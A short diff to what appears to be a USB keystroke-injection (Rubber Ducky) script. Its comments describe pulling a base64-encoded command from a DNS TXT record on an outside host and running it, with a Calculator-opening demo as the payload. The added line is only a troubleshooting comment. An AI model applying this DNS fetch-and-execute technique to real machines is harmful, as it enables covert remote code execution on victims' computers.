@@ -5,6 +5,7 @@ REM b3BlbiAtbiAtYSBjYWxjdWxhdG9yCg==
 REM In my case: nslookup -querytype=txt calcb64.iparanoid.eu
 REM Results in: 
 REM calcb64.iparanoid.eu    text = "b3BlbiAtbiAtYSBjYWxjdWxhdG9yCg=="
+REM >>>> IF THE SCRIPT DOESN’T WORK, TRY REMOVE THESE COMMENTS (i.e. starting with "REM") <<<<
 DELAY 500
 GUI SPACE
 DELAY 500
